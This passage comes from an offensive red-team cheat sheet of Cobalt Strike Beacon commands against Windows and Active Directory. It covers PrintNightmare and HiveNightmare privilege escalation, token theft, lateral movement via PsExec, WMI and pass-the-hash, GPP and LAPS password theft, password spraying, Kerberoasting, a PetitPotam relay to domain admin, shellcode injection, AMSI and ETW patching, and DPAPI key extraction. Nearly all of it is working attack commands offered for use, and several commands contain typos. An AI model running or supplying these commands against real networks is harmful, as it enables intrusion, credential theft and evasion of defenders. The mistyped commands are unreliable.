execute-assembly C:\SeatBelt.exe -group=system -outputfile="C:\Temp\SeatBelt-system.json"
<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>###  Run only Chrome checks - returns bookmarks, history, presence
</span></code></pre></div>
execute-assembly C:\SeatBelt.exe -group=chromium -outputfile="C:\Temp\SeatBelt-chrome.json"
<div class="language-text highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>###  Run only remote-related checks - returns things like network shares, putty sessions, RDP connections/settings, Filezilla, Windows firewall, etc.
</span></code></pre></div>
execute-assembly C:\SeatBelt.exe -group=remote -outputfile="C:\Temp\SeatBelt-remote.json"
<div class="language-text highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a>###  Run only miscellaneous-related checks - returns things like Chrome data, logon events, LOBAS, interesting files, downloads, PS events, scheduled tasks, etc.
</span></code></pre></div>
execute-assembly C:\SeatBelt.exe -group=misc -outputfile="C:\Temp\SeatBelt-misc.json"
<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>### ### ###  Watson - .NET version of Sherlock.ps1 to look for missing KBs on Windows
</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>
</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>###  Peroform all checks and output to console
</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>###  Supports:
</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>    Windows 10 1507, 1511, 1607, 1703, 1709, 1803, 1809, 1903, 1909, 2004
</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>    Server 2016 &amp; 2019
</span></code></pre></div>
execute-assembly C:\Watson.exe 
<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>###  PrintNightmare priv esc exploit (CVE-2021-3452)
</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>###  Impacket&#39;s PrintNightmare: https://github.com/cube0x0/CVE-2021-1675
</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>###  Impacket&#39;s SharpNightmare (Csharp): https://github.com/cube0x0/CVE-2021-1675/tree/main/SharpPrintNightmare
</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>###  PowerShell PrintNightmare local priv esc: https://github.com/calebstewart/CVE-2021-1675
</span><span id="__span-25-5"><a id="__codelineno-25-5" name="__codelineno-25-5" href="#__codelineno-25-5"></a>
</span><span id="__span-25-6"><a id="__codelineno-25-6" name="__codelineno-25-6" href="#__codelineno-25-6"></a>###  Local priv esc
</span></code></pre></div>
execute-assembly C:\SharpPrintNightmare.exe C:\addCube.dll
<div class="language-text highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a>###  RCE using existing context
</span></code></pre></div>
execute-assembly C:\SharpPrintNightmare.exe '\192.168.1.215\smb\addCube.dll' '\192.168.1.20'
<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>###  RCE using runas /netonly
</span></code></pre></div>
execute-assembly C:\SharpPrintNightmare.exe '\192.168.1.215\smb\addCube.dll' '\192.168.1.10' hackit.local domain_user Pass123
<div class="language-text highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a>###  HiveNightmare priv esc SAM dump (CVE-2021–36934)
</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a>Exploit in Windows 10 and 11 which allows you to read the SAM, SYSTEM and SECURITY hives as a low-privileged user
</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a>
</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a>###  First check privileges to read SAM hive
</span></code></pre></div>
run icacls C:\Windows\System32\config\SAM
--&gt; If the results show success and the group BUILTIN\Users has privileges (I)(RX) then the SAM file should be readable by all users! 
<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>###  Exploit: Csharp implementation (https://github.com/cube0x0/CVE-2021-36934)
</span></code></pre></div>
execute-assembly C:\CVE-2021-36934.exe
--&gt; Dumps hashes to console upon successful exploitation
<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>### ### ###  Stealing logon tokens
</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>If you obtained local Administrator privileges, you can steal a session token of another process to inherit their token privileges. This might require you to escalate to a SYSTEM Beacon if its being blocked.&lt;br /&gt;
</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>`steal_token &lt;PID&gt;`
</span><span id="__span-30-4"><a id="__codelineno-30-4" name="__codelineno-30-4" href="#__codelineno-30-4"></a>
</span><span id="__span-30-5"><a id="__codelineno-30-5" name="__codelineno-30-5" href="#__codelineno-30-5"></a>### ### ###  Elevating to SYSTEM Beacon
</span><span id="__span-30-6"><a id="__codelineno-30-6" name="__codelineno-30-6" href="#__codelineno-30-6"></a>Assuming you gained local administrator privileges, one option to elevate to a SYSTEM Beacon is to use scheduled tasks to create a new scheduled task to run your payload as SYSTEM.&lt;br /&gt;
</span></code></pre></div>
run schtasks /create /tn "TaskName" /sc once /U DOMAIN\username /P Password1! /tr "cmd.exe /c C:\path\to\Payload.exe" /ru SYSTEM
run schtasks /run /tn "TaskName" --&gt; Should pop SYSTEM Beacon
<div class="language-text highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>------------------------------------------------------------------------------------------
</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>### ###  Lateral Movement
</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>Cobalt Strike jumping (OUTDATED)
</span><span id="__span-31-4"><a id="__codelineno-31-4" name="__codelineno-31-4" href="#__codelineno-31-4"></a>###  Jump using WinRM if it&#39;s enabled for the current user on the target system
</span></code></pre></div>
jump winrm64 ops-jumpbox.lab.com HTTPSLISTENER
<div class="language-text highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a>###  Jump using PsExec if it&#39;s enabled for the current user on the target system
</span></code></pre></div>
jump psexec64 ops-jumpbox.lab.com HTTPSLISTENER
<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>Cobalt Strike remote-exec - Executes commands on a target system using psexec, winrm or wmi (OUTDATED)
</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>
</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>###  remote-exec using WMI
</span></code></pre></div>
remote-exec wmi ops-jumpbox.lab.com cmd.exe /c "C:\Users\Public\payload.exe"
<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>###  remote-exec using PsExec
</span></code></pre></div>
remote-exec psexec ops-jumpbox.lab.com cmd.exe /c "C:\Users\Public\payload.exe"
<div class="language-text highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a>Enable Powershell Remoting manually
</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a>
</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a>###  Enable on local system with Admin privileges
</span></code></pre></div>
powershell Enable-PSRemoting –Force
<div class="language-text highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a>###  Enable on remote system 
</span></code></pre></div>
make_token AD\admin Password123! --&gt; Token with Admin privileges on remote system is required
run psexec.exe \TestComputer.lab.com -h -s powershell.exe Enable-PSRemoting -Force
<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>###  Test remote access
</span></code></pre></div>
powershell Invoke-Command -ComputerName TestComputer -ScriptBlock { whoami; hostname }
<div class="language-text highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a>[RACE.ps1](https://github.com/samratashok/RACE): ACL attacks for lateral movement, persistence and privilege escalation
</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a>Stealthier than above method since it doesn&#39;t touch disk
</span></code></pre></div>
powershell-import --&gt; RACE.ps1
make_token AD\Admin password --&gt; This tool requires Admin privileges on the remote system being targeted</p>
<p>powershell Set-RemotePSRemoting -SamAccountName testuser -ComputerName ops-jumpbox.lab.com --&gt; Force enable PS remoting for the specific user
powershell Set-RemoteWMI -SamAccountName testuser -Computername ops-jumpbox.lab.com --&gt; (Optional) Force enable WMI for the specific user
<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>###  Now we can move laterally in CS with WinRM for the specified user
</span></code></pre></div>
make_token AD\testuser password
jump [winrm/winrm64] ops-jumpbox.lab.com HTTPSLISTENER
<div class="language-text highlight"><pre><span></span><code><span id="__span-40-1"><a id="__codelineno-40-1" name="__codelineno-40-1" href="#__codelineno-40-1"></a>Scheduled task lateral movement
</span><span id="__span-40-2"><a id="__codelineno-40-2" name="__codelineno-40-2" href="#__codelineno-40-2"></a>
</span><span id="__span-40-3"><a id="__codelineno-40-3" name="__codelineno-40-3" href="#__codelineno-40-3"></a>###  First copy payload files to remote system manually
</span><span id="__span-40-4"><a id="__codelineno-40-4" name="__codelineno-40-4" href="#__codelineno-40-4"></a>###  Create task on remote system
</span></code></pre></div>
run schtasks /create /tn "MyTask" /sc once /U DOMAIN\username /P Password1! /S target-host.domain.com /tr "cmd.exe /c C:\Windows\temp\Payload.exe"
<div class="language-text highlight"><pre><span></span><code><span id="__span-41-1"><a id="__codelineno-41-1" name="__codelineno-41-1" href="#__codelineno-41-1"></a>###  Execute remote task
</span></code></pre></div>
run schtasks /run /tn "MyTask" /S target-host.domain.com
<div class="language-text highlight"><pre><span></span><code><span id="__span-42-1"><a id="__codelineno-42-1" name="__codelineno-42-1" href="#__codelineno-42-1"></a>[Invoke-TheHash](https://github.com/Kevin-Robertson/Invoke-TheHash) - PS tools to perform SMB and WMI pass-the-hash attacks
</span></code></pre></div></p>
<p>powershell-import 
powerpick Invoke-WMIExec -Target 192.168.100.20 -Domain LAB.com -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose
powerpick Invoke-SMBExec -Target 192.168.100.20 -Domain LAB.com -Username TEST -Hash F6F38B793DB6A94BA04A52F1D3EE92F0 -Command "command or launcher to execute" -verbose
<div class="language-text highlight"><pre><span></span><code><span id="__span-43-1"><a id="__codelineno-43-1" name="__codelineno-43-1" href="#__codelineno-43-1"></a>Over-pass-the-hash with Rubeus
</span><span id="__span-43-2"><a id="__codelineno-43-2" name="__codelineno-43-2" href="#__codelineno-43-2"></a>Inject a ticket into memory using known credentials and then move to a system that user has access to
</span><span id="__span-43-3"><a id="__codelineno-43-3" name="__codelineno-43-3" href="#__codelineno-43-3"></a>
</span><span id="__span-43-4"><a id="__codelineno-43-4" name="__codelineno-43-4" href="#__codelineno-43-4"></a>###  Revert to original token in CS
</span></code></pre></div>
rev2self
<div class="language-text highlight"><pre><span></span><code><span id="__span-44-1"><a id="__codelineno-44-1" name="__codelineno-44-1" href="#__codelineno-44-1"></a>###  Create and inject new ticket into memory
</span></code></pre></div>
execute-assembly C:\Rubeus.exe asktgt /domain:lab.com /user:admin1 /rc4:<NTLM-hash> /ptt
<div class="language-text highlight"><pre><span></span><code><span id="__span-45-1"><a id="__codelineno-45-1" name="__codelineno-45-1" href="#__codelineno-45-1"></a>###  Run network commands as that user
</span></code></pre></div>
ls \jumpbox.lab.com\C$
jump winrm64 jumpbox.lab.com
<div class="language-text highlight"><pre><span></span><code><span id="__span-46-1"><a id="__codelineno-46-1" name="__codelineno-46-1" href="#__codelineno-46-1"></a>[Move Kit](https://github.com/0xthirteen/MoveKit)
</span><span id="__span-46-2"><a id="__codelineno-46-2" name="__codelineno-46-2" href="#__codelineno-46-2"></a>Aggressor script using execute-assembly, SharpMove and SharpRPD assemblies for doing lateral movement with various techniques
</span><span id="__span-46-3"><a id="__codelineno-46-3" name="__codelineno-46-3" href="#__codelineno-46-3"></a>
</span><span id="__span-46-4"><a id="__codelineno-46-4" name="__codelineno-46-4" href="#__codelineno-46-4"></a>[SharpExec](https://github.com/anthemtotheego/SharpExec) - CSharp tooling lateral movement
</span><span id="__span-46-5"><a id="__codelineno-46-5" name="__codelineno-46-5" href="#__codelineno-46-5"></a>
</span><span id="__span-46-6"><a id="__codelineno-46-6" name="__codelineno-46-6" href="#__codelineno-46-6"></a>###  WMI lateral movement
</span></code></pre></div>
execute-assembly SharpExec.exe -m=wmi -i=IPADDRESS -u=USER -p=PASSWORD -d=DOMAIN -e=C:\Windows\System32\cmd.exe -c="/c C:\path\to\payload"
<div class="language-text highlight"><pre><span></span><code><span id="__span-47-1"><a id="__codelineno-47-1" name="__codelineno-47-1" href="#__codelineno-47-1"></a>###  PSExec lateral movement
</span></code></pre></div>
execute-assembly SharpExec.exe -m=psexec -i=IPADDRESS -u=USER -p=PASSWORD -d=DOMAIN -e=C:\Windows\System32\cmd.exe -c="/c C:\path\to\payload"
<div class="language-text highlight"><pre><span></span><code><span id="__span-48-1"><a id="__codelineno-48-1" name="__codelineno-48-1" href="#__codelineno-48-1"></a>------------------------------------------------------------------------------------------
</span><span id="__span-48-2"><a id="__codelineno-48-2" name="__codelineno-48-2" href="#__codelineno-48-2"></a>### ###  Domain Privilege Escalation
</span><span id="__span-48-3"><a id="__codelineno-48-3" name="__codelineno-48-3" href="#__codelineno-48-3"></a>### ### ###  GPP Passwords
</span><span id="__span-48-4"><a id="__codelineno-48-4" name="__codelineno-48-4" href="#__codelineno-48-4"></a>[Get-GPPPassword.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPPassword.ps1) PowerSploit module
</span><span id="__span-48-5"><a id="__codelineno-48-5" name="__codelineno-48-5" href="#__codelineno-48-5"></a>
</span><span id="__span-48-6"><a id="__codelineno-48-6" name="__codelineno-48-6" href="#__codelineno-48-6"></a>###  Get-GPPPassword Searches a domain controller for groups.xml, scheduledtasks.xml, services.xml and datasources.xml and returns plaintext passwords
</span></code></pre></div>
powershell-import --&gt; Get-GPPPassword.ps1
powerpick Get-GPPPassword -Server ops-dc01.lab.com
<div class="language-text highlight"><pre><span></span><code><span id="__span-49-1"><a id="__codelineno-49-1" name="__codelineno-49-1" href="#__codelineno-49-1"></a>[Net-GPPPassword](https://github.com/outflanknl/Net-GPPPassword) .NET port of get-gpppassword
</span></code></pre></div>
execute-assembly C:\Net-GPPPassword.exe lab.com
<div class="language-text highlight"><pre><span></span><code><span id="__span-50-1"><a id="__codelineno-50-1" name="__codelineno-50-1" href="#__codelineno-50-1"></a>[Get-GPPAutologon.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Get-GPPAutologon.ps1) PowerSploit module
</span><span id="__span-50-2"><a id="__codelineno-50-2" name="__codelineno-50-2" href="#__codelineno-50-2"></a>
</span><span id="__span-50-3"><a id="__codelineno-50-3" name="__codelineno-50-3" href="#__codelineno-50-3"></a>###  Get-GPPAutologn searches the domain controller for registry.xml to find autologon information and returns the username and password
</span></code></pre></div>
powershell-import --&gt; Get-GPPAutologon.ps1
powerpick Get-GPPAutolgon
<div class="language-text highlight"><pre><span></span><code><span id="__span-51-1"><a id="__codelineno-51-1" name="__codelineno-51-1" href="#__codelineno-51-1"></a>###  LAPS Passwords
</span><span id="__span-51-2"><a id="__codelineno-51-2" name="__codelineno-51-2" href="#__codelineno-51-2"></a>[SharpLaps](https://github.com/swisskyrepo/SharpLAPS) - Retrive LAPS password from AD&lt;br&gt;
</span><span id="__span-51-3"><a id="__codelineno-51-3" name="__codelineno-51-3" href="#__codelineno-51-3"></a>The attribute ms-mcs-AdmPwd stores the clear-text LAPS password which is targeted here from LDAP&lt;br&gt;
</span><span id="__span-51-4"><a id="__codelineno-51-4" name="__codelineno-51-4" href="#__codelineno-51-4"></a>``` execute-assembly SharpLAPS.exe /user:DOMAIN\USER /pass:PASSWORD /host:IPADDRESS
</span></code></pre></div></p>
<h3 id="password-spraying">Password spraying</h3>
<p><a href="https://github.com/dafthack/DomainPasswordSpray">DomainPasswordSpray.ps1</a>
<div class="language-text highlight"><pre><span></span><code><span id="__span-52-1"><a id="__codelineno-52-1" name="__codelineno-52-1" href="#__codelineno-52-1"></a>powershell-import --&gt; DomainPasswordSpray.ps1
</span></code></pre></div></p>
<h3 id="get-the-full-domain-user-list-optional">Get the full domain user list (Optional)</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-53-1"><a id="__codelineno-53-1" name="__codelineno-53-1" href="#__codelineno-53-1"></a>powershell Get-DomainUserList -Domain lab.com -RemoveDisabled -RemovePotentialLockouts | Out-File -Encoding ascii userlist.txt
</span></code></pre></div>
<h3 id="password-spray-from-a-username-and-password-list">Password spray from a username and password list</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-54-1"><a id="__codelineno-54-1" name="__codelineno-54-1" href="#__codelineno-54-1"></a>powershell Invoke-DomainPasswordSpray -UserList userlist.txt -PasswordList passlist.txt -Domain lab.com -OutFile sprayed-creds.txt
</span></code></pre></div>
<h3 id="auto-spray-a-specific-password-on-an-auto-generated-user-list-very-noisy">Auto spray a specific password on an auto-generated user list (very noisy)</h3>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-55-1"><a id="__codelineno-55-1" name="__codelineno-55-1" href="#__codelineno-55-1"></a>powershell Invoke-DomainPasswordSpray -Password Summer2021
</span></code></pre></div>
Rubeus brute-force password spraying a single password or using a password file
<div class="language-text highlight"><pre><span></span><code><span id="__span-56-1"><a id="__codelineno-56-1" name="__codelineno-56-1" href="#__codelineno-56-1"></a>execute-assembbly C:\Rubeus.exe brute /password:Password123! /domain:lab.com /noticket /outfile:passes-sprayed.txt [/passwords:PASSWORDS_FILE&gt;] [/user:USER | /users:USERS_FILE] [/creduser:DOMAIN\\USER &amp; /credpassword:PASSWORD] [/dc:DOMAIN_CONTROLLER]  [/verbose] [/nowrap]
</span></code></pre></div>
<a href="https://github.com/jnqpblc/SharpSpray">SharpSpray</a> - .NET port of PowerSpray.ps1</p>
<h3 id="by-default-it-will-automatically-generate-a-user-list-from-the-domain-using-ldap">By default it will automatically generate a user list from the domain using LDAP</h3>
<h3 id="sleeps-30-minutes-between-each-password-cycle-delays-300-milliseconds-between-each-password-guess-attempt">Sleeps 30 minutes between each password cycle, delays 300 milliseconds between each password guess attempt</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-57-1"><a id="__codelineno-57-1" name="__codelineno-57-1" href="#__codelineno-57-1"></a>execute-assembly C:\SharpSpray.exe --Passwords Summer2021,Fall2021 --Sleep 30 --Delay 300
</span></code></pre></div>
<h3 id="kerberoasting">Kerberoasting</h3>
<p>PowerView kerberoasting (Outdated and still reliant on PowerShell)</p>
<h3 id="get-users-with-spn-set">Get users with SPN set</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-58-1"><a id="__codelineno-58-1" name="__codelineno-58-1" href="#__codelineno-58-1"></a>powershell Get-DomainUesr -SPN
</span></code></pre></div>
<h3 id="kerberoast-all-users">Kerberoast all users</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-59-1"><a id="__codelineno-59-1" name="__codelineno-59-1" href="#__codelineno-59-1"></a>powershell Invoke-Kerberoast - OutputFormat hashcat | fl
</span></code></pre></div>
<h3 id="kerberoast-specific-user">Kerberoast specific user</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-60-1"><a id="__codelineno-60-1" name="__codelineno-60-1" href="#__codelineno-60-1"></a>powershell Invoke-Kerberoast -Identity testaccount -Domain lab.com -OutputFormat hashcat | fl
</span></code></pre></div>
<p>Rubeus kerberoasting</p>
<h3 id="kerberoast-all-users_1">Kerberoast all users</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-61-1"><a id="__codelineno-61-1" name="__codelineno-61-1" href="#__codelineno-61-1"></a>execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHashes.txt /domain:lab.com
</span></code></pre></div>
<h3 id="kerberoast-specific-user_1">Kerberoast specific user</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-62-1"><a id="__codelineno-62-1" name="__codelineno-62-1" href="#__codelineno-62-1"></a>execute-assembly C:\Rubeus.exe kerberoast /outfile:KerbHash.txt /user:testaccount /domain:lab.com
</span></code></pre></div>
<h3 id="as-rep-roasting">### ###  AS-REP Roasting</h3>
<p>Target users in AD that do not require pre-authentication<br /></p>
<h3 id="as-rep-roast-all-users-with-rubeus">AS-REP roast all users with Rubeus</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-63-1"><a id="__codelineno-63-1" name="__codelineno-63-1" href="#__codelineno-63-1"></a>execute-assembly C:\Rubeus.exe asreproast /format:hashcat /outfile:C:\Temp\asrep-hashes.txt
</span></code></pre></div>
<h3 id="as-rep-roast-specific-user-with-rubeus">AS-REP roast specific user with Rubeus</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-64-1"><a id="__codelineno-64-1" name="__codelineno-64-1" href="#__codelineno-64-1"></a>execute-assembly C:\Rubeus.exe asreproast /user:testuser /format:hashcat /outfile:C:\Temp\asrep-hashes.txt
</span></code></pre></div>
<h3 id="coercion-attacks">Coercion attacks</h3>
<h3 id="petitpotam-ntlm-relay-to-ad-cs"><a href="https://github.com/topotam/PetitPotam">PetitPotam</a> - NTLM relay to AD CS</h3>
<blockquote>
<p>PoC tool to coerce Windows hosts to authenticate to other machines via MS-EFSRPC EfsRpcOpenFileRaw or other functions
- Requires AD CS web server enrollment enabled
- Requries Kali running Impacket on target domain</p>
</blockquote>
<h3 id="find-ad-cs-web-server-and-verify-if-web-enrollment-is-enabled-by-browsing-to-the-url-httpadcs-serverdomaincomcertsrv">Find AD CS web server and verify if web enrollment is enabled by browsing to the URL: <code>http://ADCS-server.domain.com/certsrv/</code></h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-65-1"><a id="__codelineno-65-1" name="__codelineno-65-1" href="#__codelineno-65-1"></a>run certutil.exe
</span></code></pre></div>
<h3 id="start-ntlm-relay-server-on-kali">Start NTLM relay server on Kali</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-66-1"><a id="__codelineno-66-1" name="__codelineno-66-1" href="#__codelineno-66-1"></a>python3 ntlmrelayx.py -t http://ADCS-server.domain.com/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
</span></code></pre></div>
<h3 id="force-coercion-via-petitpotam-in-cobalt-strike-beacon-observe-attack-success-in-output-if-it-worked">Force coercion via PetitPotam in Cobalt Strike Beacon - Observe "Attack Success!!!" in output if it worked</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-67-1"><a id="__codelineno-67-1" name="__codelineno-67-1" href="#__codelineno-67-1"></a>run PetitPotam.exe &lt;Kali-Listener-IP&gt; &lt;DC-IP&gt;
</span></code></pre></div>
<h3 id="ntlm-relay-output-will-have-base64-ticket-of-target-dc-machine-account">NTLM relay output will have base64 ticket of target DC machine account</h3>
<h3 id="use-rubeus-to-request-tgt-of-dc-machine-account-to-esclate-to-domain-admin">Use Rubeus to request TGT of DC machine account to esclate to Domain Admin</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-68-1"><a id="__codelineno-68-1" name="__codelineno-68-1" href="#__codelineno-68-1"></a>execute-assembly C:\Rubeus.exe asktgt /dc:&lt;DC-IP&gt; /domain:domain.com /user:&lt;DC-Machine-account&gt;$ /ptt /certificate:&lt;base64-ticket-from-output&gt;
</span></code></pre></div>
<h3 id="verify-asktgt-command-worked-by-doing-an-ls-command-on-the-dc">Verify asktgt command worked by doing an 'ls' command on the DC</h3>
<p><div class="language-text highlight"><pre><span></span><code><span id="__span-69-1"><a id="__codelineno-69-1" name="__codelineno-69-1" href="#__codelineno-69-1"></a>ls \\&lt;DC-IP&gt;\c$
</span></code></pre></div>
References:
- <a href="https://pentestlab.blog/2021/09/14/petitpotam-ntlm-relay-to-ad-cs/">https://pentestlab.blog/2021/09/14/petitpotam-ntlm-relay-to-ad-cs/</a>
- <a href="https://hakin9.org/domain-takeover-with-petitpotam-exploit/">https://hakin9.org/domain-takeover-with-petitpotam-exploit/</a></p>
<hr />
<h3 id="defense-evasion">Defense Evasion</h3>
<h3 id="shellcode-injection-techniques">Shellcode injection techniques</h3>
<p>Several methods here within Cobalt Strike or using BOFs</p>
<h3 id="spawn-a-beacon-into-an-existing-process">Spawn a beacon into an existing process</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-70-1"><a id="__codelineno-70-1" name="__codelineno-70-1" href="#__codelineno-70-1"></a>inject &lt;PID&gt; &lt;x86|x64&gt; HTTPSLISTENER
</span></code></pre></div>
<h3 id="inject-raw-shellcode-into-an-existing-process">Inject raw shellcode into an existing process</h3>
<h3 id="create-shellcode-cobbalt-strike-attacks-packages-windows-executable-s-output-raw-creates-beaconbin-file">Create shellcode: Cobbalt Strike --&gt; Attacks --&gt; Packages --&gt; Windows Executable (S) --&gt; Output = Raw --&gt; Creates "beacon.bin" file</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-71-1"><a id="__codelineno-71-1" name="__codelineno-71-1" href="#__codelineno-71-1"></a>shinect &lt;PID&gt; &lt;x86|x64&gt; C:\beacon.bin
</span></code></pre></div>
<h3 id="shellcode-injection-methods-using-windows-syscalls-with-bofs-script">Shellcode injection methods using Windows syscalls with <a href="https://github.com/ajpc500/BOFs">BOFs script</a></h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-72-1"><a id="__codelineno-72-1" name="__codelineno-72-1" href="#__codelineno-72-1"></a>syscalls_inject &lt;PID&gt; &lt;listener_name&gt;
</span><span id="__span-72-2"><a id="__codelineno-72-2" name="__codelineno-72-2" href="#__codelineno-72-2"></a>syscalls_shinject &lt;PID&gt; C:\beacon.bin
</span><span id="__span-72-3"><a id="__codelineno-72-3" name="__codelineno-72-3" href="#__codelineno-72-3"></a>static_syscalls_inject &lt;PID&gt; &lt;listener_name&gt;
</span><span id="__span-72-4"><a id="__codelineno-72-4" name="__codelineno-72-4" href="#__codelineno-72-4"></a>static_syscalls_shinject &lt;PID&gt; C:\beacon.bin
</span><span id="__span-72-5"><a id="__codelineno-72-5" name="__codelineno-72-5" href="#__codelineno-72-5"></a>syscalls_shspawn C:\beacon.bin
</span></code></pre></div>
<h3 id="amsi-patch">AMSI patch</h3>
<p><a href="https://github.com/ScriptIdiot/BOF-patchit">BOF-patchit</a> for current process <br />
<code>patchit amsi</code></p>
<p><a href="https://github.com/boku7/injectAmsiBypass">boku7/InjectAmsiBypass</a> BOF <br />
Patch AMSI in remote process
<code>inject-amsiBypass &lt;PID&gt;</code></p>
<h3 id="etw-patch">ETW patch</h3>
<p><a href="https://github.com/ScriptIdiot/BOF-patchit">BOF-patchit</a> for current process <br />
<code>patchit etw</code></p>
<p><a href="https://github.com/ajpc500/BOFs/">ajpc500/BOFs</a> ETW patch for current process<br />
<code>etw stop</code> / <code>etw start</code></p>
<h3 id="api-unhooking">API Unhooking</h3>
<p>Cobalt Strike's hail-mary unhooking function. "This is a Beacon Object File to refresh DLLs and remove their hooks. The code is from Cylance's Universal Unhooking research" <br />
<code>unbook</code></p>
<hr />
<h3 id="exploitation">Exploitation</h3>
<h3 id="dpapi-decryption-and-extraction-on-windows-systems">DPAPI decryption and extraction on Windows systems</h3>
<p><a href="https://github.com/GhostPack/SharpDPAPI">SharpDPAPI</a></p>
<h3 id="sharpdpapi-to-retrieve-domain-dpapi-backup-key-and-output-to-file-which-is-used-for-subsequent-attacks-requires-da-privileges">SharpDPAPI to retrieve domain DPAPI backup key and output to file which is used for subsequent attacks (requires DA privileges)</h3>
<div class="language-text highlight"><pre><span></span><code><span id="__span-73-1"><a id="__codelineno-73-1" name="__codelineno-73-1" href="#__codelineno-73-1"></a>execute-assembly C:\SharpDPAPI.exe backupkey /file:key.pvk
</span></code></pre></div>
